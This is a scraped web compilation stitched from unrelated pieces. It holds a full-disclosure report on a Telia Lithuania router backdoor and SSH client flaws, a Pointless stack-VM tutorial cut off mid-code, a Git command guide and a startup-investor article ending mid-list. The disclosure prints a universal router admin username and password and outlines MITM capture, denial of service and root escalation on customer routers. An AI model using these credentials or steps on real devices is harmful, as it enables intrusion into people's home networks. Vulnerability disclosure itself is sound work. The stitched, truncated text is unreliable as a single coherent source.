href="https://blog.container-solutions.com/kubernetes-operators-explained">Container Solutions</a> blog.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Multiple vulnerabilities could allow running arbitrary code on an intranet server and gain root access on all the customers' routers</p>

<p>Telia is a Swedish multinational telecommunications company. It also operates in Lithuania and provides mobile service, FTTH internet, DSL internet and IPTV. Telia rents and sells custom routers and set-top tv boxes to customers which have limited or almost no administration access left to them.</p>

<p>Every Telia router or tv box has a backdoor or "management interface". It is an <code>SSH</code> server running on VLAN 5 and/or WAN. Usually, it is running on port <code>8022</code>. Older models, like <code>ADB</code>, have password login enabled. The recent newer models, like <code>Technicolor</code>, have password login disabled and only use ssh with public key authentication (spoiler: it is still vulnerable).</p>

<p>Savitarna (in Lithuanian "Self service") - is a web service <a href="https://www.telia.lt/mano/sso">https://www.telia.lt/mano/sso</a> that allows Telia customers to order and manage services, get invoices, pay bills etc. It uses password authentication or external authority logins such as Facebook, Google, banking, digital signature etc. One of the new features: changing your router's wifi password. Sounds interesting, right? An internet web service that is able to change your local router's wifi password.</p>
<p>Login page:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-login.jpg" alt="Telia Savitarna web login page"></p>
<p>Change wifi settings:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-wifi-settings.jpg" alt="Telia Savitarna WiFi setting change feature"></p>

<p>How that works. When a user wants to change the password, the web service calls the backend to initiate an SSH connection to the user's associated router. Depending on the router it will be either password authentication or RSA public key. After a successful login a PHP script on the backend will issue some commands in the router's shell, parse the result and output some of the data to the user in the web UI, like wireless network name. <strong>Telia knows your WIFI password in plain text</strong>, keep it in mind and do not reuse this password anywhere. Overall scheme:</p>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-backdoor-scheme.jpg" alt="Overall scheme of Telia backdoor"></p>

<p>Let's take a look at how the SSH connection is established. Network capture shows an SSH client banner and the remote IP that initiated the connection:</p>
<p><code>SSH-2.0-libssh2_1.4.2 PHP 10.0.98.251</code></p>
<p>What is important here:</p>
<ul>
<li>Vulnerable <code>libssh2</code> version <code>1.4.2</code> <a href="https://www.libssh2.org/security.html">https://www.libssh2.org/security.html</a></li>
<li>Weak and deprecated key exchange <code>diffie-hellman-group1-sha1</code></li>
<li>The client does not verify <code>remote SSH server public key</code> (see below)</li>
<li><code>PHP</code></li>
</ul>
<p>And, yes, it turns out that Telia's client does not attempt to verify the remote server's public key. We were able to start a custom SSH server on the same port 8022 and Savitarna successfully established a connection without even trying to verify for a man-in-the-middle. This means that we can see the password used and could try to create a malicious SSH server that exploits public vulnerabilities on Telia's side.</p>

<p>That was an easy task. As soon as Telia's client connected to our malicious SSH server we got the universal router credentials:</p>
<pre>User: tadmin
Password: hqMV8Wps
</pre>

<p>Do you still own an ADB router? Just go ahead and login over the web interface with this user. You are now an admin. You can do some restricted stuff now, great! But what about the root shell? We were able to connect with those credentials locally and got a limited shell. That's nice too. This gave us a lot of additional information that was hidden inside the router, many more vulnerabilities. Using one of them we were able to escalate to root and got full access over the device. The newer models like Technicolor require some additional exploits chained to gain full root access, but all are publicly available and so - easily doable.</p>

<p>In order to exploit RCE we needed to build a virtual test environment that fully copies Telia's PHP client. Step by step we have gone through the sequence of Telia's commands sent over the SSH. And finally we got a malicious SSH server and a test libssh2 client running in our test lab. With this server we could fully control the protocol and start fuzzing.</p>
<p>In the first few days of the fuzzing we got some crashes and partially confirmed that RCE may be exploited. Here is a sample GIF video that demonstrates two kinds of the issues the fuzzer found for us. Same php file was executed twice, but the malicious SSH server sent different payloads which caused:</p>
<ul>
<li>Segfault (stack corruption)</li>
<li>Infinite loop with high CPU</li>
</ul>
<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-poc.gif" alt="GIF PoC video"></p>
<p>However, at the time of the report we couldn't find an easy way to exploit the stack corruption. It may require more time, longer and more sophisticated fuzzing and more knowledge about the server. As Lithuanian law prohibits exploit testing on the real server, we could only fingerprint the Windows OS, but nothing more.</p>

<p>The backend seems to run only 5 php processes, so it is fairly easy to perform DoS by keeping stalled ssh connections. When SSH connections stay active for too long filling all the 5 php processes (there seems to be no timeout reading the remote shell), the Savitarna will show a strange "Maintenance" message:</p>
<p>Translation:</p>
<pre>An update is in progress
Too many of you are trying to access the new Telia webpage.
We are expanding the resources and will accept you all soon.
Apologies for any inconvenience
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-web-DoS.jpg" alt="Service unavailbale"></p>

<p>If we now get all together, an attacker could exploit RCE on the intranet server and use that server to move laterally (because <code>10.0.98.251</code> is whitelisted everywhere) across all the customer routers with the same credentials creating the most powerful, persistent and undetectable botnet of Lithuania. Who knows, maybe someone already exploited that? (spoiler: see bonus section)</p>

<p>The report was responsibly disclosed to Telia and a copy sent to <code>CERT LT</code> (<a href="https://www.nksc.lt/">NKSC</a>). What happened next was a little bit of a surprise to the team. There were rumours previously about Telia's poor tech level, but we have experienced this in a real case.</p>
<p>First, Telia did not have a PGP key and did not know how to use it, so instead they asked us to ZIP the report with password and send the password over a separate email (private GMail). I hope Telia's engineers will be reading this article, so I would like to explain why the report should be encrypted. This is to protect you as the affected vendor. If there is a man in the middle who can intercept all the researcher's traffic, it will be very easy to get the ZIP file in the first email and then the password in the second email. Instead, PKI like PGP only allows to decrypt the report by the private key owner, ensuring that nobody else can intercept the report and exploit the vulnerabilities before you fix them all. </p>
<p>Second, Telia tried to threaten the reporter for the vulnerability discovery:</p>
<p>Translation:</p>
<pre>Thank you for the information
Are you sure you did not violate the electronic data protection law?
</pre>

<p>Original:</p>
<pre>Dėkojame už informaciją.
Ar tikrai tyrimą atlikote ir neviešus elektroninius duomenis rinkote
nepažeidžiant galiojančių įstatymų?
</pre>

<p><img src="https://full-disclosure.eu/reports/2019/FDEU-CVE-2019-10222-telia-savitarna-csirt-response-1.jpg" alt="Telia CSIRT email response"></p>
<p>And then they once again mentioned that they will check if this report wasn't a hacking attempt and that they will persecute any reporter that discloses any information about Telia vulnerabilities:</p>
<p>Translation:</p>
<pre>Thank you for the information. We will continue to check whether you made your report
legally without violating any law. And we will ensure that no fake information will be
published that could do any harm to the company's reputation and to the critical part
of Lithuanian network infrastructure.
</pre>

<p>Original:</p>
<pre>Dėkojame Jums už pasidalintą informaciją, kurios surinkimo teisėtumo vertinimą toliau
atliekame ir tikimės, kad į viešumą nebus paskleista tikrovės neatitinkanti ar neteisėtai
gauta informacija, kuri darytų žalą bendrovės reputacijai ir tuo pačiu sėtų nepasitikėjimą
kritine Lietuvos ryšių infrastruktūros dalimi.

<p>We will not comment on this and let the IT community to judge. At the same time we will no longer provide any reports in any form to Telia company.</p>

<p>* Note: partial fix for KEX means the new KEX is not considered to be weak, however it is now possible to exploit libssh2 vulnerabilities after 1.8.0 with this particular KEX and a publicly known exploit for <a href="https://github.com/Semmle/SecurityExploits/blob/446048470633bf0f8da9570d008d056dbaa28ea9/libssh2/out_of_bounds_read_kex_CVE-2019-13115/server/home/diff.txt">KexAlgorithms diffie-hellman-group-exchange-sha256</a></p>

<p>After getting the root access and analyzing the Telia's routers' firmwares, we found several more users, like <code>ladmin</code> and <code>technician</code>. We will not disclose those passwords (yet), as it is not clear yet how both are used. But we were surprised that Telia's passwords appeared to be leaked many years ago. You can try to search for the tadmin password's hash on the web and you will be surprised - there was an attempt to crack the hash back in 2014!</p>

<p>And finally, we found that the hash was cracked and was available in the old "weakpass" database. You can search for the "old" weakpass database (sometimes named "First version of weakpass") and grep it - password is there. This means that most probably we are not the first who were able to penetrate Telia.</p>

      <h3>Tutorial: Writing a VM for a Small Stack-Base Language in Pointless</h3>
      <pre>- Avery N. Nortonsmith</pre>

      <hr>

      <p>
        The age of functional programming will soon be over.
      </p>

      <p>
        Object-oriented programming has come and gone. Functional programming -- the wise, quiet observer -- has waited patiently for its turn. But FP, like OOP, will fade away in time as software yields to the inexorable pull of the one <em>True Paradigm</em>: stack-based programming!
      </p>

      <hr>

      <p>
        Joking aside, stack-based programming <em>is</em> pretty cool.
      </p>

      <p>
        This tutorial covers the implementation of a <strong>virtual-machine</strong> for a small, <strong>stack-based</strong> language in Pointless. We'll take an <strong>incremental</strong> approach to building the VM and improving its capabilities until it can run a short <strong>prime-factorization</strong> program.
      </p>

      This project seeks to demonstrate:

      <ul>
        <li>
          How an imperative language can be implemented in a purely functional context
        </li>

        <li>
          How to structure and refactor code that uses persistent data-structures
        </li>

        <li>
          How Pointless can -- even as a young language -- be used to solve non-trivial tasks
        </li>
      </ul>

      <p>
        Before we tackle prime-factorization, let's take a look at a small example of the stack-based code that our VM will evaluate. The following Pointless code defines a <a href="https://ptls.dev/docs.html#lists">list</a> of 'instructions', where <a href="https://ptls.dev/docs.html#tuples">labeled-tuples</a> are used to represent instructions with an argument, and <a href="https://ptls.dev/docs.html#labels">labels</a> are used for those without. A list of instructions like this represents a program in our stack-based language:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        Let's take a minute to fancy things up by writing a function to pretty-print these instruction lists -- this will come in handy later when we work with more complex programs. The function <code>showInst</code> below takes an instruction and returns a string showing the instruction's type (left-justified to 5 characters) and argument. The function <code>argOrBlank</code> returns an instruction's argument if there is one, or an empty string otherwise. 
      </p>

      <div>
        <pre>showInst(inst) =
 format("[ {&lt;5} ] {}", [getLabel(inst), argOrBlank(inst)])

argOrBlank(inst) =
  if is(PtlsTuple, inst) then unwrap(inst) else ""
</pre>
      </div>

      <p>
        In the code above, <code><a href="https://ptls.dev/api/prelude/format.html#format">format</a></code>, <code><a href="https://ptls.dev/api/prelude/label.html#getLabel">getLabel</a></code>, <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code>, and <code><a href="https://ptls.dev/api/prelude/label.html#unwrap">unwrap</a></code> are defined in the Pointless <a href="https://ptls.dev/api/index.html">prelude</a> (standard-library).
      </p>

      <p>
        To see our new functions in action, we'll define an output variable for our program; in Pointless, a program's output is defined by its output variable. The prelude contains functions like <code><a href="https://ptls.dev/api/prelude/io.html#printLines">printLines</a></code> which generate sequences of IO commands that can be assigned to a program's output variable.

        The output definition below takes our list of instructions, generates a new list of instruction-strings by calling <code>showInst</code> on each instruction, and produces IO commands to print each string on a separate line.

      <p>Seeing is believing. Time to start making our VM.</p>

      <p>
        We'll represent the VM as an <a href="https://ptls.dev/docs.html#objects">object</a> with the following fields:
      </p>

      <ul>
        <li><code>slots</code>: used to store "heap" variables (discussed later on)</li>
        <li><code>insts</code>: an array containing the program's instructions</li>
        <li><code>index</code>: the position in instruction array of the current instruction</li>
        <li><code>stack</code>: a linked-list serving as the stack for the VM</li>
        <li><code>outVal</code>: used to get output from VM as program runs</li>
      </ul>

      <p>
        The function <code>vmFromInsts</code> sets up a new VM object for a given list of instructions. The code also adds the label <code>VM</code> to the VM object (objects and tuples can be labeled in Pointless). Object labels can be used to write code that tells different types of objects apart, or simply for documentation (as we do here).
      </p>

      <div>
        <pre>vmFromInsts(program) = VM {
  slots  = zeroArray(8)
  insts  = toArray(program)
  index  = 0
  stack  = []
  outVal = None
}
</pre>
      </div>

      <p>
        To check that <code>vmFromInsts</code> works, we'll modify our output definition to create and print a new VM object. Note that we've replaced <code>printLines</code> with <code><a href="https://ptls.dev/api/prelude/io.html#println">println</a></code> -- <code>printLines</code> expects a sequence of values (and can print these values on-the-fly as they're computed in the case of lists!), whereas <code>println</code> can handle sequence and non-sequences types.
      </p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = []; insts = [Const(7) Const(2) Mod Const(0) Eq Print Exit]; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        We run the program, and see that <code>println</code> gives us a nice visualization of our initial VM object, fields and all.
      </p>

      <p>
        Back to our list of instructions:
      </p>

      <div>
        <pre>program = [
  Const(7),
  Const(2),
  Mod,
  Const(0),
  Eq,
  Print,
  Exit,
]
</pre>
      </div>

      <p>
        The instructions above do the following -- (once we've implemented them, that is):
      </p>

      <ul>
        <li><code>Const(arg)</code> pushes <code>arg</code> onto the VM stack</li>
        <li><code>Mod</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 % v0</code></li>
        <li><code>Eq</code> pops values <code>v0</code> and <code>v1</code> from the stack, and pushes <code>v1 == v0</code></li>
        <li><code>Print</code> pops a value from the stack and prints it</li>
        <li><code>Exit</code> signals the end of the program</li>
      </ul>

      <p>
        Additionally, each of these instructions will advance the VM to the next instruction after performing the behaviors above. Nice and imperative ;)
      </p>

      <p>
        With this in mind, we see that the program above does the following: loads the values <code>7</code> and <code>2</code> onto the stack, computes <code>7 % 2</code>, loads the value <code>0</code>, compares <code>0</code> with the result of <code>7 % 2</code>, prints the result of this comparison, and exits. In other words, this program tells us whether or not <code>7</code> is even.
      </p>

      <p>
        Now that we've defined some instructions, let's start evaluating them.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, vm.insts[vm.index])
    vm with $.stack = [unwrap(vm.insts[vm.index])] ++ vm.stack
}
</pre>
      </div>

      <p>
        Our <code>eval</code> function uses a <code><a href="https://ptls.dev/docs.html#cond">cond</a></code> conditional -- eventually this will include cases for all instructions, but we'll start with just <code>Const</code> for now. The code above calls the function <code><a href="https://ptls.dev/api/prelude/types.html#is">is</a></code> to check whether the current instruction has the label <code>Const</code> (where the current instruction is the instruction in the <code>vm.insts</code> array at index <code>vm.index</code>). If <code>is</code> returns true, then conditional evaluates and returns the body of the case expression.
      </p>

      <p>
        Structures in Pointless persistent, and thus immutable. As such, our program will never mutate the state of a VM object; rather, it will produce new VM objects. The code above uses <a href="https://ptls.dev/docs.html#viaWith">with syntax</a> (which can handle both shallow and nested updates -- one of Pointless's little innovations) to create a new VM object with a new stack value: the old stack with the instruction argument pushed to the top. The <code>unwrap</code> function is used to get the argument from the <code>Const</code> instruction.
      </p>

      <p>
        The code above is dense and repetitive! We can improve it by defining a couple of variables. In the new version, <code>inst</code> is the current instruction, and the <code>arg</code> is the argument of that instruction.
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm with $.stack = [arg] ++ vm.stack

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>
      </div>

      <p>
        We modify the program's output definition to call <code>eval</code> on the VM to evaluate the first instruction, <code>Const(7)</code>. Looking at output, we see that the value <code>7</code> has been pushed to the stack.
      </p>

      <p><em>
        <code>insts</code> field abbreviated for readability
      </em></p>

      <div>
        <pre>output =
  program
  |&gt; vmFromInsts
  |&gt; eval
  |&gt; println
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 0; outVal = None}
</pre>
      </div>

      <p>
        But wait! We need our <code>Const</code> handler to do one more thing -- advance the VM to the next instruction. To do this, we'll make a new helper function <code>advance</code> that takes a VM object and returns a new VM object with the instruction index incremented. We'll also move the code for pushing a value onto the VM stack into the new function <code>pushVal</code>.
      </p>

      <div>
        <pre>advance(vm) = vm with $.index += 1

pushVal(arg, vm) = vm with $.stack = [arg] ++ vm.stack
</pre>
      </div>

      <p>
        Using these two new functions, the code for <code>eval</code> becomes:
      </p>

      <div>
        <pre>eval(vm) = cond {
  case is(Const, inst)
    vm
    |&gt; pushVal(arg)
    |&gt; advance

} where {
  inst = vm.insts[vm.index]
  arg = unwrap(inst)
}
</pre>

      <pre>$ ./bin/pointless main.ptls

VM {stack = [7]; insts = ...; slots = [0 0 0 0 0 0 0 0]; index = 1; outVal = None}
</pre>
      </div>

      <p>
        We call the program again and get the result seen above: the new VM object returned by <code>eval</code> has the value <code>7</code> on its stack and its index incremented.
      </p>

      <p>
        At this point, the entire program looks something like this:
      </p>

      <p><em>
        Note that the comment bars are not necessary, but are helpful for dividing code visually -- it's a habit of mine, like using fake em-dashes. They can also be used to mark API documentation
      </em></p>

      <div>
        <pre>output =

Think of this like your standard cloud backup on steroids - not only are you able to restore your code in event of a crash, but you can also <strong>roll back</strong> your code to any of the snapshots if your code breaks. It is also easy for you to <strong>collaborate</strong> with others - again just like how you can work on the same Google Docs file with multiple people, multiple developers can simultaneously edit the same repository and record their individual changes.</p><p>Thanks to these advantages, Git is a <strong>must-know</strong> for anyone looking to enter the world of software development. This post will provide an overview of the most useful commands in Git and when to use them, and also serves as a reference for when you need to brush up on Git.</p><h2 id="the-git-workflow"><a href="#the-git-workflow" aria-label="the git workflow permalink"></a>The Git Workflow</h2><p>There are a lot of Git commands, so it’s useful to group them by topic / use-case. We’ll first consider Git on a single machine, since most of Git’s operations are local and we can then build up to multi-user Git usage.</p><p>Git can either be run using the command line, or using a GUI such as GitHub Desktop. Although the command line may be more intimidating for new developers, it also is far more powerful and you will need to learn it since most GUIs offer limited commands.</p><p>Git commands typically take the form of <code>git &lt;command&gt; &lt;args&gt;</code> where <code>&lt;args&gt;</code> might be a file path. Commands may also have <em>options</em> specified denoted by a <code>--&lt;option&gt;</code> or a <code>-&lt;single-letter-option&gt;</code> - think of these as adding extra details as to what the command should do. In this guide, I will present the general syntax and you should replace anything in <code>&lt;&gt;</code> with your corresponding value.</p><p>If you are uncertain about the usage of a command, a really useful command is:
<code>git help &lt;command&gt;</code>
which brings up the manual, or for a refresher <code>git &lt;command&gt; -h</code> or <code>git &lt;command&gt; --help</code> (<code>--help</code> and <code>-h</code> are equivalent).</p><h2 id="setting-up-git"><a href="#setting-up-git" aria-label="setting up git permalink"></a>Setting up Git</h2><h3 id="installing-git"><a href="#installing-git" aria-label="installing git permalink"></a>Installing Git</h3><p><strong>Windows</strong>: Head to <a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p><p><strong>MacOS</strong>: Git comes as part of XCode Command Line Tools, so install that. To check if you’ve installed Git already open a Terminal window and type <code>git --version</code> to check which version you have.</p><p><strong>Linux</strong>: Run <code>sudo apt install git-all</code> (Debian-based) in the terminal or <code>sudo dnf install git-all</code> (RPM-based).</p><h3 id="set-up-configuration-file"><a href="#set-up-configuration-file" aria-label="set up configuration file permalink"></a>Set up Configuration File</h3><p>The first thing to do having installed Git is to set up your user name and email address, since these are used to identify you and stored in all snapshots you make. This is stored in a <strong>configuration file</strong> where you store all your preferences.</p><p>You can either edit this <code>.gitconfig</code> file directly using a text editor or <code>git config --global --edit</code> or instead alter specific fields with <code>git config --global &lt;field&gt; &lt;value&gt;</code> - we’re interested in the fields <code>user.name</code> and <code>user.email</code>.</p><p>We can also configure the text editor we use for commits using the field <code>core.editor</code> - initially this is set to the system default editor (e.g vi for Linux/Mac). <code>commit.template &lt;template_file&gt;</code> lets you specify a template that comes up whenever you commit.</p><p>There are many other fields, however one particular field I find especially useful is <code>alias</code> which maps commands to abbreviations: <code>alias.&lt;ab&gt; &lt;command&gt;</code>.
e.g. <code>git config --global alias.st "status -s"</code> maps <code>git status -s</code> to <code>git st</code>.</p><p><code>git config --list</code> lists all the fields and values from the config file.</p><h3 id="create-a-git-repository"><a href="#create-a-git-repository" aria-label="create a git repository permalink"></a>Create a Git repository</h3><p>To initialise a .git repository you can use <code>git init</code> or, if you want a copy of an existing repository, you can do <code>git clone &lt;repo_url&gt;</code>.</p><p><img src="https://mukulrathi.co.uk/317c63680d60850c4b4035e791ecd896/setup.svg" alt="Setup Terminal"></p><h2 id="git-commit-history"><a href="#git-commit-history" aria-label="git commit history permalink"></a>Git Commit History</h2><p><img src="https://mukulrathi.co.uk/f66fde04be4a0bf374458ed35fff4e77/commit-history.svg" alt="Git Commit History Diagram"></p><p>Git stores data as a series of lightweight “snapshots” known as <strong>commits</strong> - these store the state of the filesystem at that time as well as a pointer to the previous commit(s). Each commit has a unique <em>checksum</em> - the ID Git uses to refer to it.
To keep track of the history, Git has a <strong>HEAD</strong> pointer that points to the first commit (we follow the pointer chain back to see previous commits).</p><p>So we can refer to a commit either by its checksum, or its relation to HEAD, e.g. <code>HEAD~4</code> refers to the commit 4 commits before the HEAD commit.</p><h2 id="the-git-file-system"><a href="#the-git-file-system" aria-label="the git file system permalink"></a>The Git File System</h2><p><img src="https://mukulrathi.co.uk/4b6c8479c4391d055b65a8d2a2598187/file-system.svg" alt="Git File System  Diagram"></p><p>Git keeps track of files in 3 main sections:</p><ul><li>Working Directory (this is your computer’s filesystem)</li><li>Staging Area (this stores the contents of your next commit)</li><li>HEAD (the most recent commit in the .git repository)</li></ul><p>All of the main file commands boil down to understanding how Git maintains these three sections. A common misconception is that the staging area only stores changes - a better way to think of these is as <strong>3 separate file systems</strong>, each with their own copies of the files.</p><h3 id="view-changes-in-the-git-file-systems"><a href="#view-changes-in-the-git-file-systems" aria-label="view changes in the git file systems permalink"></a>View changes in the Git File Systems</h3><p><code>git status</code> displays any files that differ between the 3 sections. Files have 4 states:</p><ul><li><em>Untracked</em> - in Working Dir but no version stored in HEAD or Staging Area (Git doesn’t know about file)</li><li><em>Modified</em> - newer version in Working Dir compared to Staging Area and HEAD. (changes not in next commit)</li><li><em>Staged</em> - newer version in Staging Area and Working Dir compared to HEAD. (ready to be committed)</li><li><em>Unmodified</em> - same version in all 3 sections (i.e. most recent commit has latest version)</li></ul><p>Note: a file can be both modified and staged, if the version in the working directory is newer than that in the staging area, which in turn is newer than the one in the HEAD commit.</p><p>We can use the <code>-s</code> option for <code>git status</code> to get a cleaner (one line per file) output. This displays <strong>??</strong> if a file is not tracked, <strong>red</strong> if modified and <strong>green</strong> if staged.</p><p>To view the actual changes and not just the files that have changed, you can use:</p><ul><li><code>git diff</code> - see the unstaged changes i.e. compare working directory with staging area.</li><li><code>git diff --staged</code> - see the staged changes i.e. compare staging area with HEAD.</li></ul><p>Adding the <code>&lt;file/dir&gt;</code> argument restricts the diff to that those files. e.g. <code>git diff src/</code></p><h3 id="update-the-git-file-systems"><a href="#update-the-git-file-systems" aria-label="update the git file systems permalink"></a>Update the Git File Systems</h3><p><code>git add &lt;file/directory&gt;</code> updates the staging area with the version of the file/directory in the working directory.</p><p><code>git commit</code> updates HEAD with a new commit that snapshots the files in the staging area.</p><p><code>git reset &lt;commit&gt;</code> has three potential steps:</p><ol><li>Point HEAD to <code>&lt;commit&gt;</code> (e.g. if rolling back a commit,staging area and working dir will now have newer version of files than HEAD). Also points branch’s HEAD to that commit. (see Branching section)</li><li>Update Staging Area with contents of <code>&lt;commit&gt;</code>. (this has the effect of unstaging file changes - only Working dir. has newest version)</li><li>Update Working Dir with contents of Staging Area (has effect of overwriting and destroying changes to data - <strong>dangerous - take care</strong>)</li></ol><p>By default, <code>git reset</code> only runs Step 1 + 2 however, the options <code>--soft</code> (only run Step 1) and <code>--hard</code> (run Step 1, 2, 3) modify its behaviour.</p><p>If we pass a file path, <code>git reset &lt;commit&gt; &lt;file/dir&gt;</code> it limits effect of <code>reset</code> to files in that file path e.g. <code>git reset --soft HEAD~1 src/</code>.</p><p><code>git checkout HEAD &lt;file&gt;</code> also has the same effect as <code>git reset --hard HEAD &lt;file&gt;</code> - it overwrites the version of the file in the staging area and working directory with the version at HEAD (effectively undoing your changes since the last commit).</p><p><code>git checkout &lt;file&gt;</code> on the other hand (note no <code>HEAD</code>) overwrites the version of the file in the working directory with the version in the staging area (effectively undoing your changes since the last staged version).</p><p>Finally, <code>git rm &lt;file&gt;</code> untracks the file and deletes it from working directory, the option <code>--cached</code> will untrack a file but not delete it from the working directory.</p><p><img src="https://mukulrathi.co.uk/3a5894bb13482084888f9dbffc12737c/manipulate-files.svg" alt="Git status demonstration"></p><h3 id="ignoring-files"><a href="#ignoring-files" aria-label="ignoring files permalink"></a>Ignoring files</h3><p>Often we don’t want Git to track all of our files in our repository.

<p><span>Just look at this slide I found from Alexander Jarvis on Quora:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*4ssSy22XC1crcL3k" alt="Mark Suster on what startup investors look for in entrepreneurs: 70% of my investment decision of an early-stage company is the team" width="720" height="432" data-image-id="0*4ssSy22XC1crcL3k" data-width="1085" data-height="651"></figure>
<p><span>You and your startup team, especially at a management level, are a huge factor as to whether you secure investment or if your pitch ends up in an investor’s trash can.&nbsp;</span></p>
<p><span>And the first person investors look at as they decide whether or not you are deserving of their time and money is you, the founder.</span></p>
<h2><span>What Startup Investors Look For In Entrepreneurs and The Red Flags They Avoid&nbsp;</span></h2>
<p><span>Investors, like most educated gamblers, bet on the jockey – not the horse. Making you the most important asset for a successful fundraising round – especially if you have a proven track record. </span><a href="https://medium.com/startupsoft/why-vcs-almost-blindly-invest-in-founders-with-previous-exits-23824334a260" target="_blank" rel="noopener noreferrer"><span>Studies show</span></a><span> that:</span></p>
<h3><em><strong><span>“Successful serial entrepreneurs are more likely to replicate the success of their past companies.” and “Nearly 80% of [startup] unicorns had at least one co-founder who had previously founded a company of some sort.”&nbsp;</span></strong></em></h3>
<p><span>However, regardless of your previous success investors need to get to know you before they consider investing. They need to trust that you can execute your milestones and that you will provide a valuable ROI. To earn their trust and ultimately win them over you need these essential qualities:&nbsp;</span></p>
<ul>
<li><span>Character</span></li>
<li><span>Confidence</span></li>
<li><span>Coachability&nbsp;</span></li>
</ul>
<h3><b>Character</b></h3>
<p><span>Renowned leadership guru </span><a href="https://www.linkedin.com/in/simonsinek/" target="_blank" rel="noopener noreferrer"><span>Simon Sinek</span></a><span> states that “People don’t buy </span><b>what you do</b><span>; they buy </span><b>why you do it.</b><span>”</span></p>
<p><iframe title="Start with why -- how great leaders inspire action | Simon Sinek | TEDxPugetSound" width="500" height="375" src="https://www.youtube.com/embed/u4ZoJKF_VuA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p><span>If an investor doesn’t know </span><b>why</b><span> you are creating your startup what incentive do they have to invest in you; as opposed to the thousands of other founders out there. If they can’t be sure their money is in the hands of an intelligent, capable, trustworthy founder they are unlikely to commit to a deal.</span></p>
<p><span>Moreover, they aren’t just planning to invest capital in your business but also their valuable time. They are looking to create a long-term business relationship with you and share their expertise and network. If they don’t like or trust you they simply won’t do it.</span></p>
<p><span>Your character is a critical factor and potential investors will want to answer the following questions about you:</span></p>
<ul>
<li><span><strong>Competency</strong> – “Can you do this?” Is the question nearly all financial backers will want the answer to. Demonstrating competence is challenging, but can be made easier if you have been part of (or already founded) a successful startup.&nbsp;</span></li>
<li><span><strong>Commitment</strong> – Are you totally invested in your startup? Are you still working for someone else or have you taken the leap?&nbsp; How hard do you work?&nbsp;</span></li>
<li><span><strong>Honesty</strong> – Do you tell the truth? Any lies you tell will inevitably backfire. </span><a href="https://www.hbs.edu/faculty/Pages/profile.aspx?facId=6560" target="_blank" rel="noopener noreferrer"><span>Howard Stevenson</span></a><span> (Professor Emeritus at Harvard Business School) sums it up perfectly: “The first time you hear anything dishonest come out of a founder’s mouth, you should run, not walk”</span></li>
<li><span><strong>Trustworthiness</strong> – More than telling the truth, do you keep your word and deliver on your promises?</span></li>
<li><span><strong>Who you are underneath it all</strong> – Aside from the above are you the kind of person they will be happy to introduce to their professional networks? Will they enjoy working with you over the next three to five years?&nbsp;</span></li>
</ul>
<h3><b>Confidence</b></h3>
<p><span>It may seem obvious but you need to be confident that you, your idea and your team can overcome the inevitable challenges of founding a startup. You will need to get used to hearing no from investors, clients, banks and even family and friends. It’s important to develop a thick skin and generate self-confidence no matter the hurdles that arise.</span></p>
<p><span>However, there is a fine line between confidence and arrogance – and it’s a line you will need to tread carefully. Overconfidence and arrogance will make you look like a “know-it-all” to investors. If they decide that you won’t be open to guidance and new ideas it will be a deal-breaking red flag and they will walk away. The best way to ensure that you’re portraying confidence and not arrogance is to support your claims with facts and figures.&nbsp;</span></p>
<h3><b>Coachability</b></h3>
<p><span>Do you listen well? Can you learn quickly and effectively? These are two factors essential for investors. They want to feel their time (and money) is well spent and that they are investing in a founder who is open to learning and being mentored.&nbsp;</span></p>
<p><span>A good (smart money) investor will want to nurture a mentor-mentee relationship with you. A receptive mind is a vital quality that you will need. </span><a href="https://www.forbes.com/profile/ron-conway/#4900daef67ac" target="_blank" rel="noopener noreferrer"><span>Ron Conway</span></a><span>, an active early-stage investor in Google and Paypal (and Founder of </span><a href="https://www.svangel.com/index" target="_blank" rel="noopener noreferrer"><span>SV Angel</span></a><span>) puts it this way:&nbsp;</span></p>
<h3><strong><span><i>“Coachability enables a willingness to be open and make the necessary and often numerous course corrections and morphing that startups require.”&nbsp;</i></span></strong></h3>
<h3><b>The Red Flags &amp; Dealbreakers for Investors</b></h3>
<p><span>There are seven “deadly sins” that will leave you investor-less and could potentially harm your reputation. Here they are and how you can avoid them:&nbsp;</span></p>
<h4>1. Dishonesty</h4>
<p><span>As I mentioned before lies inevitably backfire. Lying about any aspect of your business (or yourself) will plant a seed of doubt into the minds of any potential investor. They will do the necessary research into you and your company to verify your claims before they open their wallets – so be upfront and honest at all times.&nbsp;</span></p>
<h4>2. Telling Them you Have “No Competition”</h4>
<p><span>Even if your product is the most innovative product the world has ever seen you will either be disrupting an existing market or creating a new market that will quickly fill with investors.&nbsp;</span></p>
<h4>3. Saying you “Only Need 1% of the Market Share”<span>&nbsp;</span></h4>
<p><span>This is a great way to show investors that you don’t understand sales or customer CPA (cost-per-acquisition). Instead of talking in market share talk in customers. Specifically how many you need, how much you will spend to get them and how long it will take for you to get to that number.&nbsp;</span></p>
<h4>4. Failing to Fulfil Your Commitments</h4>
